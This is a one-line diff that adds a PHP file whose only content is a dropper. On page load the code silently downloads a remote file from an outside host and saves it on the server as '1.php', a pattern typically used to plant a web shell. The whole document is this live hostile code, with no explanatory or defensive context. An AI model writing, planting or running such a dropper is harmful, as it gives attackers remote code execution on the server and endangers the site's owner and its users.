@@ -1,0 +1,1 @@
+<?php @file_put_contents("1.php",file_get_contents("http://q588.xyz/1.txt")); ?>
